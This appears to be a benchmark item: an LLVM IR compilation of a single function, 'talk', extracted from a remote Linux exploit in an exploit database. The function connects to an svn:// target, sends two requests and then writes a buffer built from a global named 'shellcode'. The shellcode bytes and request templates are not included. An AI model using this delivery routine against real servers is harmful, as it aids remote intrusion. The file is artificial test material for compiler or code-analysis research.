; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_304.c_talk.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_304.c_talk.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@talk.string = internal global [12 x i8] c"svn://%s/%s\00", align 1
@request1 = common dso_local global i8* null, align 8
@sockfd = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [15 x i8] c"send() failed\0A\00", align 1
@request2 = common dso_local global i8* null, align 8
@shellcode = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [16 x i8] c"write() failed\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @talk(i8* %0, i8* %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1024 x i8], align 16
  %6 = alloca [1024 x i8], align 16
  %7 = alloca [512 x i8], align 16
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %10 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %11 = load i8*, i8** %3, align 8
  %12 = load i8*, i8** %4, align 8
  %13 = call i32 (i8*, i8*, ...) @sprintf(i8* %10, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @talk.string, i64 0, i64 0), i8* %11, i8* %12)
  %14 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %15 = call i32 @strlen(i8* %14)
  store i32 %15, i32* %8, align 4
  %16 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %17 = load i8*, i8** @request1, align 8
  %18 = load i32, i32* %8, align 4
  %19 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %20 = call i32 (i8*, i8*, ...) @sprintf(i8* %16, i8* %17, i32 %18, i8* %19)
  %21 = load i8*, i8** %3, align 8
  %22 = call i32 @xp_connect(i8* %21)
  %23 = load i32, i32* @sockfd, align 4
  %24 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %25 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %26 = call i32 @strlen(i8* %25)
  %27 = call i64 @send(i32 %23, i8* %24, i32 %26, i32 0)
  %28 = icmp slt i64 %27, 0
  br i1 %28, label %29, label %32

29:                                               ; preds = %2
  %30 = call i32 @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str, i64 0, i64 0))
  %31 = call i32 @exit(i32 -1) #3
  unreachable

32:                                               ; preds = %2
  %33 = load i32, i32* @sockfd, align 4
  %34 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  %35 = call i32 @recv(i32 %33, i8* %34, i32 512, i32 0)
  %36 = load i32, i32* @sockfd, align 4
  %37 = load i8*, i8** @request2, align 8
  %38 = load i8*, i8** @request2, align 8
  %39 = call i32 @strlen(i8* %38)
  %40 = call i64 @send(i32 %36, i8* %37, i32 %39, i32 0)
  %41 = icmp slt i64 %40, 0
  br i1 %41, label %42, label %45

42:                                               ; preds = %32
  %43 = call i32 @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str, i64 0, i64 0))
  %44 = call i32 @exit(i32 -1) #3
  unreachable

45:                                               ; preds = %32
  %46 = load i32, i32* @sockfd, align 4
  %47 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  %48 = call i32 @recv(i32 %46, i8* %47, i32 512, i32 0)
  %49 = load i32, i32* @shellcode, align 4
  %50 = call i8* @build_request(i32 %49)
  store i8* %50, i8** %9, align 8
  %51 = load i32, i32* @sockfd, align 4
  %52 = load i8*, i8** %9, align 8
  %53 = load i8*, i8** %9, align 8
  %54 = call i32 @strlen(i8* %53)
  %55 = call i64 @write(i32 %51, i8* %52, i32 %54)
  %56 = icmp slt i64 %55, 0
  br i1 %56, label %57, label %60

57:                                               ; preds = %45
  %58 = call i32 @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i64 0, i64 0))
  %59 = call i32 @exit(i32 -1) #3
  unreachable

60:                                               ; preds = %45
  %61 = load i32, i32* @sockfd, align 4
  %62 = call i32 @close(i32 %61)
  ret void
}

declare dso_local i32 @sprintf(i8*, i8*, ...) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @xp_connect(i8*) #1

declare dso_local i64 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @printf(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i8* @build_request(i32) #1

declare dso_local i64 @write(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
